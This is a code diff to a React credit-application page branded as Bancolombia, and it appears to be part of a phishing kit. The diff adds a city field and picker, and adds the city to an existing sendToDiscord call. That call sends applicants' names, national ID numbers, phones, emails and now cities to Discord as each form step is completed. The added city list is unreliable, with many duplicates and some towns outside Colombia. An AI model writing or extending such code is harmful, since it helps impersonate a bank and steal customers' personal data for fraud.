@@ -8,8 +8,8 @@ import {
   Heart,
   Smartphone,
   ChevronDown,
-  Clock,
   DollarSign,
+  Clock,
   FileText,
   User,
   Phone,
@@ -18,6 +18,7 @@ import {
   Briefcase,
   AlertCircle,
   Lock,
+  MapPin,
 } from 'lucide-react';
 
 type FormStep = 0 | 1 | 2 | 3 | 4;
@@ -28,6 +29,7 @@ interface FormData {
   cedula: string;
   telefono: string;
   email: string;
+  ciudad: string;
   monto: string;
   plazo: string;
   tipoEmpleo: string;
@@ -40,11 +42,212 @@ const INITIAL_FORM: FormData = {
   cedula: '',
   telefono: '',
   email: '',
+  ciudad: '',
   monto: '',
   plazo: '',
   tipoEmpleo: '',
   ingresos: '',
 };
+
+const CIUDADES_COLOMBIA = [
+  "Abejorral", "Ábrego", "Abraham Cala", "Acacías", "Acandí", "Acevedo", "Achí", "Agrado", "Agua de Dios", "Aguachica",
+  "Aguada de Oro", "Aguadas", "Aguazul", "Agustín Codazzi", "Aipe", "Albania", "Albania", "Alcalá", "Aldana",
+  "Alejandría", "Algeciras", "Alicante", "Almaguer", "Almeida", "Alpujarra", "Altamira", "Alto Baudó", "Alto del Nudo",
+  "Altos del Rosario", "Alvarado", "Amagá", "Amalfi", "Ambalema", "Anapoima", "Ancuya", "Andalucía", "Andes",
+  "Angelópolis", "Angostura", "Anolaima", "Anorí", "Anserma", "Ansermanuevo", "Anzá", "Anzoátegui", "Apartadó",
+  "Apía", "Apulo", "Aquitania", "Aracataca", "Aranzazu", "Aratoca", "Arauca", "Arauquita", "Arbeláez", "Arboleda",
+  "Arboledas", "Arboletes", "Arcabuco", "Arenal", "Argelia", "Argelia", "Argelia", "Ariguaní", "Arjona",
+  "Armenia", "Armenia", "Armero", "Arroyohondo", "Astrea", "Ataco", "Atrato", "Ayapel", "Bagadó", "Bahía Solano",
+  "Bajo Baudó", "Balboa", "Balboa", "Baranoa", "Barbacoas", "Barbosa", "Barbosa", "Barichara", "Barrancabermeja",
+  "Barrancas", "Barranco de Loba", "Barrancominas", "Barranquilla", "Becerril", "Belén", "Belén de Bajirá",
+  "Belén de Umbría", "Bello", "Belmira", "Beltrán", "Berbeo", "Betania", "Betéitiva", "Betulia", "Betulia",
+  "Bituima", "Bochalema", "Bogotá", "Bojacá", "Bojayá", "Bolívar", "Bolívar", "Bolívar", "Bolívar",
+  "Bosconia", "Boyacá", "Briceño", "Briceño", "Bucaramanga", "Bucarasica", "Buenaventura", "Buenavista",
+  "Buenavista", "Buenavista", "Buenavista", "Buenos Aires", "Buesaco", "Buga", "Bugalagrande", "Buriticá",
+  "Busbanzá", "Cabrera", "Cabrera", "Cabuyaro", "Cáceres", "Cachará", "Cachipay", "Cácota", "Caicedo",
+  "Caicedonia", "Caimito", "Cajamarca", "Cajibío", "Cajicá", "Calamar", "Calamar", "Calarcá", "Caldas",
+  "Caldas", "Caldono", "Calera", "Caleta", "Calí", "Calima", "Calixto", "Callo", "Campamento",
+  "Campo de la Cruz", "Campoalegre", "Campohermoso", "Canalete", "Canchimal", "Candelaria", "Candelaria",
+  "Cantagallo", "Cantón de San Pablo", "Caparrapí", "Cáqueza", "Caracolí", "Caramanta", "Carcasí",
+  "Carepa", "Carmen de Apicalá", "Carmen de Carupa", "Carmen del Darién", "Carolina", "Cartagena",
+  "Cartagena del Chairá", "Cartago", "Carurú", "Casabianca", "Casacarí", "Caseros", "Castilla La Nueva",
+  "Caucasia", "Cañasgordas", "Cepitá", "Cértegui", "Cerinza", "Cerrito", "Cerro de San Antonio", "Cerro Azul",
+  "Chachaguí", "Chaguaní", "Chalán", "Chaparral", "Charalá", "Charta", "Chía", "Chibolo", "Chicoral",
+  "Chigorodó", "Chima", "Chimá", "Chimichagua", "Chinácota", "Chinavita", "Chinú", "Chipaque", "Chipata",
+  "Chiquinquirá", "Chiriguaná", "Chiscas", "Chita", "Chitagá", "Chivatá", "Chivolo", "Chivor",
+  "Choachí", "Chocontá", "Cicuco", "Ciénaga", "Ciénaga de Oro", "Cimitarra", "Circasia", "Cisneros",
+  "Clavijo", "Clemencia", "Cómbita", "Concepción", "Concepción", "Concordia", "Concordia", "Condoto",
+  "Confines", "Consaca", "Contadero", "Contratación", "Convención", "Copacabana", "Coper", "Córdoba",
+  "Córdoba", "Córdoba", "Corinto", "Coromoro", "Corozal", "Corrales", "Cota", "Cotorra", "Covarachía",
+  "Coveñas", "Coyaima", "Cravo Norte", "Cuaspud", "Cubarral", "Cubará", "Cuenca", "Cuenca", "Cuervo",
+  "Cúcuta", "Cucutilla", "Cuítiva", "Cumaral", "Cumaribo", "Cumbal", "Cumbitara", "Cunday", "Curillo",
+  "Curití", "Curumaní", "Dabeiba", "Dagua", "Dibulla", "Distracción", "Dolores", "Don Matías", "Doncello",
+  "Dosquebradas", "Duitama", "Durania", "Ebéjico", "El Águila", "El Bagre", "El Banco", "El Cairo", "El Calvario",
+  "El Callao", "El Cantón de San Pablo", "El Carmen", "El Carmen de Atrato", "El Carmen de Bolívar",
+  "El Carmen de Chucurí", "El Castillo", "El Cerrito", "El Charco", "El Cocuy", "El Colegio",
+  "El Copey", "El Doncello", "El Dorado", "El Dovio", "El Espino", "El Guacamayo", "El Guamo",
+  "El Litoral del San Juan", "El Lloró", "El Molino", "El Pacífico", "El Paso", "El Paujil",
+  "El Peñol", "El Peñón", "El Peñón", "El Piñón", "El Playón", "El Retén", "El Retorno",
+  "El Roble", "El Rosal", "El Rosario", "El Santuario", "El Tablón de Gómez", "El Tambo", "El Tambo",
+  "El Tarra", "El Tejado", "El Torno", "El Valle", "El Venado", "El Yopal", "Elías", "Encino", "Enciso",
+  "Engativá", "Entrerríos", "Envigado", "Escalerita", "España", "Espinal", "Estación", "Estrella",
+  "Facatativá", "Falan", "Filandia", "Filandia", "Firavitoba", "Flandes", "Florencia", "Florencia",
+  "Florián", "Florida", "Floridablanca", "Fómeque", "Fonseca", "Fortul", "Fosca", "Francisco Pizarro",
+  "Fredonia", "Fresno", "Frontino", "Fuente de Oro", "Fundación", "Funes", "Funza", "Fúquene",
+  "Fusagasugá", "Gachalá", "Gachancipá", "Gachantivá", "Gachetá", "Gama", "Gambita", "Gámeza",
+  "Garagoa", "García", "Garzón", "Génova", "Gigante", "Ginebra", "Giraldo", "Girardot", "Girardota",
+  "Girasol", "Girón", "Gobernador", "Gómez Plata", "González", "Gramalote", "Granada", "Granada",
+  "Granada", "Granada", "Guaca", "Guacamayas", "Guacarí", "Guachavés", "Guachené", "Guachetá",
+  "Guachucal", "Guadalupe", "Guadalupe", "Guadalupe", "Guadalupe", "Guaduas", "Guaitarilla", "Gualmatán",
+  "Guamal", "Guamal", "Guamuez", "Guani", "Guapí", "Guapotá", "Guaranda", "Guarne", "Guasca",
+  "Guatapé", "Guataquí", "Guavatá", "Guayatá", "Guayabal de Síquima", "Guayabetal", "Guayllabamba",
+  "Güepsa", "Gutiérrez", "Hacaritama", "Hato", "Hato Corozal", "Hato Nuevo", "Hatonuevo", "Heliconia",
+  "Herrán", "Herrera", "Hobo", "Honda", "Ibagué", "Icononzo", "Iles", "Imuris", "Inírida", "Inírida",
+  "Inzá", "Ipiales", "Irra", "Istmina", "Itagüí", "Ituango", "Iza", "Jagua de Ibirico", "Jalpa",
+  "Jamundí", "Jenesano", "Jericó", "Jericó", "Jerusalén", "Jesús María", "Jordán", "Juan de Acosta",
+  "Junín", "Juradó", "La Apartada", "La Argentina", "La Belleza", "La Calera", "La Capilla",
+  "La Ceja", "La Celia", "La Cruz", "La Cumbre", "La Dorada", "La Esperanza", "La Estrella",
+  "La Florida", "La Gloria", "La Jagua de Ibirico", "La Jagua del Pilar", "La Llanada", "La Macarena",
+  "La Magdalena", "La Merced", "La Mesa", "La Montañita", "La Nava", "La Palma", "La Paz",
+  "La Paz", "La Peña", "La Pintada", "La Plata", "La Playa de Belén", "La Primavera", "La Salina",
+  "La Sierra", "La Tebaida", "La Tola", "La Unión", "La Unión", "La Unión", "La Unión",
+  "La Uribe", "La Vega", "La Vega", "La Victoria", "La Victoria", "La Victoria",
+  "La Virginia", "Labateca", "Labranzagrande", "Landázuri", "Laraquete", "Largo", "Lebrija",
+  "Leiva", "Lejanías", "Lenguazaque", "Lérida", "Lerma", "Leticia", "Líbano", "Linares",
+  "Lloró", "Lorica", "Los Andes", "Los Andes Sotomayor", "Los Córdobas", "Los Corrales",
+  "Los Palmitos", "Los Patios", "Los Ríos", "Los Santos", "Lourdes", "Luis Calvo",
+  "Luruaco", "Luz de América", "Macanal", "Macaravita", "Maceo", "Machetá", "Machiques",
+  "Madrid", "Magangué", "Magüí", "Mahates", "Maicao", "Málaga", "Malambo", "Mallama",
+  "Manatí", "Manaure", "Manaure Balcón del Cesar", "Maní", "Manizales", "Manta", "Medellín",
+  "Medina", "Medina", "Melgar", "Mercaderes", "Mesetas", "Milagro", "Miraflores", "Miraflores",
+  "Miranda", "Miravalles", "Mistrató", "Mitú", "Mocoa", "Mogotes", "Molagavita", "Momil",
+  "Mompós", "Mongua", "Monguí", "Moniquirá", "Montebello", "Montecristo", "Montelíbano",
+  "Montenegro", "Montería", "Monterrey", "Moñitos", "Morales", "Morales", "Morelia",
+  "Morichal", "Morroa", "Mosquera", "Mosquera", "Motavita", "Murindo", "Murillo",
+  "Mutatá", "Mutiscua", "Muzo", "Nabar", "Nariño", "Nariño", "Nariño", "Nariño",
+  "Natagaima", "Nazareth", "Nechí", "Nemocón", "Nilo", "Nimaima", "Nobsa", "Nocaima",
+  "Norcasia", "Norosí", "Nueva Granada", "Nuevo Colón", "Nuevo Tolima", "Nunchía",
+  "Nuquí", "Obando", "Ocaña", "Ocamonte", "Oíba", "Oicatá", "Olaya", "Olaya Herrera",
+  "Onzaga", "Ophite", "Oporto", "Oracabessa", "Orcas", "Orito", "Orocué", "Ortega",
+  "Ospina", "Otanche", "Ovejas", "Pachavita", "Pacho", "Padilla", "Páez", "Páez",
+  "Paicol", "Pailitas", "Paipa", "Pajarito", "Palacio", "Palermo", "Palestina", "Palestina",
+  "Palmar", "Palmar de Varela", "Palmas del Socorro", "Palmira", "Palmoriente", "Palo Alto",
+  "Panqueba", "Papunau", "Papayal", "Paracas", "Paratebueno", "Pasca", "Paso de la Arena",
+  "Patía", "Pauna", "Paya", "Paz de Ariporo", "Paz de Río", "Pedraza", "Pelaya",
+  "Pensilvania", "Peñol", "Peque", "Pereira", "Pérez", "Pesca", "Piamonte", "Piedecuesta",
+  "Piedras", "Piendamó", "Pijao", "Pijaos", "Pijuí", "Pilao", "Pili", "Pinchote",
+  "Piojó", "Pital", "Pitalito", "Pivijay", "Planadas", "Planeta Rica", "Plato", "Playón",
+  "Policarpa", "Polonuevo", "Ponedera", "Popayán", "Pore", "Portachuelo", "Porto",
+  "Prado", "Providencia", "Providencia y Santa Catalina", "Puebla", "Pueblorrico",
+  "Pueblo Bello", "Pueblo Nuevo", "Pueblo Viejo", "Puebloviejo", "Puente Nacional",
+  "Puerto Alvira", "Puerto Araujo", "Puerto Asís", "Puerto Berrío", "Puerto Boyacá",
+  "Puerto Caicedo", "Puerto Carreño", "Puerto Colombia", "Puerto Concordia",
+  "Puerto Escondido", "Puerto Gaitán", "Puerto Guzmán", "Puerto Leguízamo",
+  "Puerto Libertador", "Puerto López", "Puerto Lleras", "Puerto Murillo",
+  "Puerto Nariño", "Puerto Nus", "Puerto Parra", "Puerto Rondón", "Puerto Rosario",
+  "Puerto Salgar", "Puerto Santander", "Puerto Tejada", "Puerto Triunfo",
+  "Puerto Valdivia", "Puerto Wilches", "Pulí", "Pupiales", "Purificación",
+  "Purísima", "Quebradanegra", "Queremal", "Quetame", "Quibdó", "Quimbaya",
+  "Quinchía", "Quindío", "Quinientos", "Quintana", "Quipile", "Ragonvalia",
+  "Ramiriquí", "Ráquira", "Rastro", "Raudal", "Recetor", "Regidor", "Remedios",
+  "Remolino", "Repelón", "Restrepo", "Restrepo", "Retiro", "Ricaurte", "Ricaurte",
+  "Río Blanco", "Río de Oro", "Río Frío", "Río Iró", "Río Quito", "Río Sucio",
+  "Río Viejo", "Rioblanco", "Riofrío", "Riohacha", "Rionegro", "Riosucio",
+  "Riosucio", "Risaralda", "Ritoque", "Rivera", "Roberto Payán", "Rocha",
+  "Roldanilla", "Roldanillo", "Roncesvalles", "Rondón", "Rosario", "Rosas",
+  "Rovira", "Sabanalarga", "Sabanalarga", "Sabanalarga", "Sabana de Torres",
+  "Sabanagrande", "Sabanas de San Ángel", "Sabaneta", "Saboyá", "Sácama",
+  "Sáchica", "Sagrada", "Sahagún", "Saladoblanco", "Salamina", "Salamina",
+  "Salazar", "Salazar de las Palmas", "Saldaña", "Salento", "Salgar", "Salinas",
+  "Samacá", "Samaná", "Samaniego", "Sampués", "San Agustín", "San Alberto",
+  "San Andrés", "San Andrés de Cuerquia", "San Andrés de Sotavento",
+  "San Andrés y Providencia", "San Antonio", "San Antonio del Tequendama",
+  "San Antonio de Palmito", "San Basilio de Palenque", "San Benito",
+  "San Benito Abad", "San Bernardo", "San Bernardo", "San Bernardo del Viento",
+  "San Calixto", "San Carlos", "San Carlos", "San Carlos de Guaroa",
+  "San Cayetano", "San Cayetano", "San Cipriano", "San Cristóbal",
+  "San Diego", "San Dimas", "San Dionisio", "San Eduardo", "San Estanislao",
+  "San Felipe", "San Fernando", "San Francisco", "San Francisco", "San Francisco",
+  "San Francisco", "San Gabriel", "San Gil", "San Hipólito", "San Ignacio",
+  "San Isidro", "San Jacinto", "San Jacinto del Cauca", "San Jerónimo",
+  "San Jorge", "San José", "San José de Albán", "San José de la Montaña",
+  "San José de las Claras", "San José de Miranda", "San José de Pare",
+  "San José de Uré", "San José del Fragua", "San José del Guaviare",
+  "San José del Palmar", "San Juan", "San Juan de Arama", "San Juan de Betulia",
+  "San Juan de los Llanos", "San Juan de Pasto", "San Juan de Río Seco",
+  "San Juan de la Costa", "San Juan de la Vega", "San Juan de Rioseco",
+  "San Juan del César", "San Juan Nepomuceno", "San Juanito",
+  "San Lorenzo", "San Lorenzo", "San Lucas", "San Luis", "San Luis",
+  "San Luis de Gaceno", "San Luis de Palenque", "San Marcos",
+  "San Martín", "San Martín", "San Martín de Loba", "San Mateo",
+  "San Miguel", "San Miguel de Sema", "San Miguel del Tigre",
+  "San Onofre", "San Pablo", "San Pablo", "San Pablo de Borbur",
+  "San Pablo de los Llanos", "San Pascual", "San Patricio",
+  "San Pedro", "San Pedro", "San Pedro", "San Pedro de Cartago",
+  "San Pedro de los Milagros", "San Pedro de Urabá",
+  "San Pedro del Sur", "San Pelayo", "San Rafael", "San Ramón",
+  "San Roque", "San Sebastián", "San Sebastián de Buenavista",
+  "San Sebastián de los Andes", "San Silvestre", "San Simón",
+  "San Teodoro", "San Tiburcio", "San Vicente", "San Vicente de Chucurí",
+  "San Vicente del Caguán", "San Zenón", "Sandoná", "Santa Ana", "Santa Ana",
+  "Santa Ana de los Caballeros", "Santa Bárbara", "Santa Bárbara",
+  "Santa Bárbara", "Santa Bárbara de Pinto", "Santa Catalina",
+  "Santa Catalina de Alejandría", "Santa Cecilia", "Santa Clara",
+  "Santa Cruz", "Santa Cruz de Mompox", "Santa Cruz de la Sierra",
+  "Santa Elena", "Santa Fe de Antioquia", "Santa Gertrudis",
+  "Santa Helena del Opón", "Santa Inés", "Santa Inés", "Santa Isabel",
+  "Santa Lucía", "Santa Marta", "Santa María", "Santa María",
+  "Santa Rosa", "Santa Rosa de Cabal", "Santa Rosa de Lima",
+  "Santa Rosa de Osos", "Santa Rosa de Viterbo", "Santa Rosa del Sur",
+  "Santa Rosalía", "Santa Sofía", "Santa Teresa", "Santa Victoria",
+  "Santana", "Santander de Quilichao", "Santiago", "Santiago de Tolú",
+  "Santiago Pérez", "Santo Domingo", "Santo Domingo", "Santo Tomás",
+  "Santuario", "Santuario", "Sardinata", "Saravena", "Sasaima",
+  "Sativanorte", "Sativasur", "Saucio", "Segovia", "Sesquilé",
+  "Sevilla", "Siachoque", "Sibaté", "Sibundoy", "Sierra",
+  "Sierra Nevada", "Silos", "Silva", "Silvania", "Simacota",
+  "Simijaca", "Simití", "Sinay", "Sincelejo", "Sinejón",
+  "Sitionuevo", "Soacha", "Soatá", "Socha", "Socotá", "Socorro",
+  "Sogamoso", "Solano", "Soledad", "Soledad de los Negros",
+  "Solita", "Somondoco", "Sonsón", "Sopetrán", "Soplaviento",
+  "Sora", "Soracá", "Sotaquirá", "Sotara", "Sotomayor",
+  "Suaita", "Suárez", "Suárez", "Suárez", "Suan", "Subachoque",
+  "Sucre", "Sucre", "Sucre", "Sucre", "Suesca", "Supatá",
+  "Supía", "Suratá", "Sutamarchán", "Sutatenza", "Tabio",
+  "Tadó", "Talaigua Nuevo", "Támesis", "Taminango", "Tangua",
+  "Tapias", "Taraira", "Tarapacá", "Tarazá", "Tarqui", "Tarso",
+  "Tasco", "Tauramena", "Tausa", "Tello", "Tena", "Tenza",
+  "Teorama", "Tequendama", "Teruel", "Tibacuy", "Tibaná",
+  "Tibasosa", "Tibirita", "Tibú", "Tibu", "Tierralta", "Timaná",
+  "Timbío", "Timbiquí", "Tinjacá", "Tipacoque", "Tiquisio",
+  "Titiribí", "Toca", "Tocancipá", "Toledo", "Toledo",
+  "Tolima", "Tolú", "Toluviejo", "Tona", "Topaga", "Topaipí",
+  "Toribío", "Toribío", "Toro", "Tota", "Totachoque",
+  "Totoguaje", "Totoró", "Trinidad", "Trujillo", "Tubará",
+  "Tuchín", "Tulúa", "Tumaco", "Tunja", "Tununguá", "Turbaco",
+  "Turbaná", "Turbo", "Turmequé", "Tuta", "Tutazá",
+  "Tutumbe", "Ubala", "Ubalá", "Ubaque", "Ubaté", "Ulloa",
+  "Umbita", "Une", "Unguía", "Unión", "Unión Panamericana",
+  "Uramita", "Urapal", "Uribe", "Uribia", "Urrao", "Urrao",
+  "Urumita", "Usiacurí", "Usme", "Ustariz", "Uvita", "Valdivia",
+  "Valencia", "Valencia de Jesús", "Valle", "Valle de San José",
+  "Valle de San Juan", "Valle del Guamuez", "Valledupar", "Valparaíso",
+  "Valparaíso", "Vegachí", "Vega", "Vega de San Mateo",
+  "Vega de los Padres", "Venadillo", "Venecia", "Venecia",
+  "Venta Quemada", "Ventaquemada", "Vergara", "Versalles",
+  "Vianí", "Vichada", "Victoria", "Vidales", "Viena",
+  "Vigía del Fuerte", "Vijes", "Villa Caro", "Villa de Leyva",
+  "Villa de San Diego de Ubaté", "Villa del Rosario", "Villa Rica",
+  "Villagarzón", "Villahermosa", "Villamaría", "Villanueva",
+  "Villanueva", "Villanueva", "Villanueva", "Villapinzón",
+  "Villarrica", "Villas del Rosario", "Villavicencio", "Villavieja",
+  "Villeta", "Villota", "Viota", "Viracachá", "Vista Hermosa",
+  "Viterbo", "Yacopí", "Yacuanquer", "Yaguará", "Yalí",
+  "Yarumal", "Yavaraté", "Yeguas", "Yolombó", "Yondó",
+  "Yopal", "Yotoco", "Yumbo", "Zambrano", "Zamora",
+  "Zapatoca", "Zaragoza", "Zaragoza", "Zarzal", "Zelandia",
+  "Zenón", "Zetaquira", "Zipaquirá", "Zona Bananera", "Zuas"
+];
 
 function BancolombiaLogo() {
   return <img src="/image.png" alt="Bancolombia" className="h-8 w-auto" />;
@@ -150,6 +353,73 @@ function SelectField({
   );
 }
 
+function CitySearch({
+  value,
+  onChange,
+  error,
+}: {
+  value: string;
+  onChange: (v: string) => void;
+  error?: string;
+}) {
+  const [query, setQuery] = useState(value);
+  const [open, setOpen] = useState(false);
+  const ref = useRef<HTMLDivElement>(null);
+
+  const filtered = query
+    ? CIUDADES_COLOMBIA.filter(c => c.toLowerCase().includes(query.toLowerCase())).slice(0, 50)
+    : [];
+
+  useEffect(() => {
+    const handler = (e: MouseEvent) => {
+      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
+    };
+    document.addEventListener('mousedown', handler);
+    return () => document.removeEventListener('mousedown', handler);
+  }, []);
+
+  return (
+    <div className="flex flex-col gap-1 relative" ref={ref}>
+      <label className="text-sm font-medium text-gray-700">Ciudad</label>
+      <div className="relative">
+        <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4 z-10" />
+        <input
+          value={query}
+          onChange={e => { setQuery(e.target.value); setOpen(true); }}
+          onFocus={() => { if (query) setOpen(true); }}
+          placeholder="Busca tu ciudad..."
+          className={`w-full pl-10 pr-4 py-3 rounded-xl border text-sm outline-none transition-all focus:border-[#FFCC00] focus:ring-2 focus:ring-[#FFCC00]/20 ${
+            error ? 'border-red-400 bg-red-50' : 'border-gray-200 bg-gray-50'
+          }`}
+        />
+      </div>
+      {open && filtered.length > 0 && (
+        <div className="absolute top-full mt-1 left-0 right-0 bg-white border border-gray-200 rounded-xl shadow-lg max-h-48 overflow-y-auto z-50">
+          {filtered.map(c => (
+            <button
+              key={c}
+              type="button"
+              className={`w-full text-left px-4 py-2 text-sm hover:bg-[#FFCC00]/20 transition-colors ${value === c ? 'bg-[#FFCC00]/30 font-semibold' : ''}`}
+              onClick={() => { setQuery(c); onChange(c); setOpen(false); }}
+            >
+              {c}
+            </button>
+          ))}
+        </div>
+      )}
+      {!open && value && (
+        <p className="text-xs text-gray-400 mt-0.5">{value}</p>
+      )}
+      {error && (
+        <p className="text-xs text-red-500 flex items-center gap-1">
+          <AlertCircle className="w-3 h-3" />
+          {error}
+        </p>
+      )}
+    </div>
+  );
+}
+
 function CreditForm({ onClose }: { onClose: () => void }) {
   const [step, setStep] = useState<FormStep>(0);
   const [esCliente, setEsCliente] = useState<boolean | null>(null);
@@ -176,13 +446,14 @@ function CreditForm({ onClose }: { onClose: () => void }) {
   const sentSteps = useRef(new Set<string>());
 
   useEffect(() => {
-    if (step === 1 && form.nombre.trim() && form.apellido.trim() && /^\d{6,12}$/.test(form.cedula) && /^\d{10}$/.test(form.telefono) && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) && !sentSteps.current.has('step1')) {
+    if (step === 1 && form.nombre.trim() && form.apellido.trim() && /^\d{6,12}$/.test(form.cedula) && /^\d{10}$/.test(form.telefono) && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) && form.ciudad.trim() && !sentSteps.current.has('step1')) {
       sentSteps.current.add('step1');
       sendToDiscord('step1', [
         { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
         { name: 'Cédula', value: form.cedula, inline: true },
         { name: 'Teléfono', value: form.telefono, inline: true },
         { name: 'Email', value: form.email, inline: true },
+        { name: 'Ciudad', value: form.ciudad, inline: true },
       ]);
     }
     if (step === 2 && form.monto && form.plazo && !sentSteps.current.has('step2')) {
@@ -259,6 +530,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     if (!form.cedula.trim() || !/^\d{6,12}$/.test(form.cedula)) e.cedula = 'Cédula inválida';
     if (!form.telefono.trim() || !/^\d{10}$/.test(form.telefono)) e.telefono = 'Teléfono inválido (10 dígitos)';
     if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Correo inválido';
+    if (!form.ciudad.trim()) e.ciudad = 'Selecciona tu ciudad';
     setErrors(e);
     return Object.keys(e).length === 0;
   };
@@ -1242,6 +1514,11 @@ function CreditForm({ onClose }: { onClose: () => void }) {
                 form={form}
                 errors={errors}
                 update={update}
+              />
+              <CitySearch
+                value={form.ciudad}
+                onChange={v => update('ciudad', v)}
+                error={errors.ciudad}
               />
             </div>
           ) : step === 2 ? (
